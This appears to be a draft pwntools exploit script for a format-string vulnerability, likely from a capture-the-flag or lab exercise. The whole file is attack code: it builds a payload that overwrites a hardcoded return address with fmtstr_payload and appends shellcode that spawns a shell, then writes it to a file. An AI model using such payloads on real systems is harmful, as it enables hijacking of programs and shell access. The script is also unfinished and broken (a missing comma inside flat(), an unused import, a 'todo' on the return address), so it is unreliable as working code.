# format string vuln, into a 200 byte  buffer
# idea will be to do:
#    buffer address + shellcode + formatstring exp to overwrite return

from locale import format_string
from pwn import *

buffer = 0xffffd5f0
target = buffer + 4
retaddr = 0xffffd5fc # todo get final ret addr

payload = flat(
    fmtstr_payload(2, {retaddr : target})
    asm(shellcraft.sh())
)

write("payload.txt", payload)